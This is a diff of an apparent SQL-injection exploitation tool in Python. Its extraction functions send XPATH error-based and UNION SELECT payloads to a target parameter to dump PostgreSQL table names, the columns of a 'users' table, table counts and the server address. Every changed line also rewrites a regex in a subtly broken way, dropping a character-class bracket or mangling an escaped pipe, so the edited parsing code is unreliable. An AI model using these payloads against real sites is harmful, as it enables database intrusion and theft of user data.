@@ -213,7 +213,7 @@ def _try_extract_single(target, param, payload, patterns):
                 if val and 1 < len(val) < 500:
                     return val
         # XPATH Syntax Error Fallback
-        xpath_m = re.search(r'XPATH syntax error:\s*[\'"]?([^\'"<\s][^\'"<]{0,200})', resp.text, re.I)
+        xpath_m = re.search(r'XPATH syntax error:\s*[\'"]?(^\'"<\s][^\'"<]{0,200})', resp.text, re.I)
         if xpath_m:
             val = xpath_m.group(1).strip('~').strip()
             if val and len(val) > 1:
@@ -264,7 +264,7 @@ def _try_extract_data(target, db_type='mysql', param='id'):
     }
     
     db_xpath = xpath_map.get(db_type, xpath_map['mysql'])
-    xpath_patterns = [r'~([^~]+)~', r'XPATH syntax error:\s*[\'"]?([^\'"<\s][^\'"<]{0,200})',
+    xpath_patterns = [r'~([^~]+)~', r'XPATH syntax error:\s*[\'"]?(^\'"<\s][^\'"<]{0,200})',
                       r'ORA-\d+:\s*([^\r\n<]{3,200})', r'ERROR:\s*([^\r\n<]{3,200})']
     
     for label, payload in db_xpath.items():
@@ -314,7 +314,7 @@ def _try_extract_data(target, db_type='mysql', param='id'):
             'tables': [("1' UNION SELECT CONCAT('|||T:',string_agg(table_name,','),'|||'),NULL,NULL FROM information_schema.tables WHERE table_schema='public'--", r'\|\|\|T:([^\|]+)\|\|\|')],
             'columns': [("1' UNION SELECT CONCAT('|||C:',string_agg(column_name,','),'|||'),NULL,NULL FROM information_schema.columns WHERE table_name='users'--", r'\|\|\|C:([^\|]+)\|\|\|')],
             'counts': [
-                ("1' UNION SELECT CONCAT('|||N:',count(*),'|||'),NULL,NULL FROM information_schema.tables WHERE table_schema='public'--", r'\|\|\|N:(\d+)\|\\|'),
+                ("1' UNION SELECT CONCAT('|||N:',count(*),'|||'),NULL,NULL FROM information_schema.tables WHERE table_schema='public'--", r'\|\|\|N:(\d+)\\\|'),
                 ("1' UNION SELECT CONCAT('|||H:',inet_server_addr(),'|||'),NULL,NULL--", r'\|\|\|H:([^\|]+)\|\|\|'),
             ],
         },
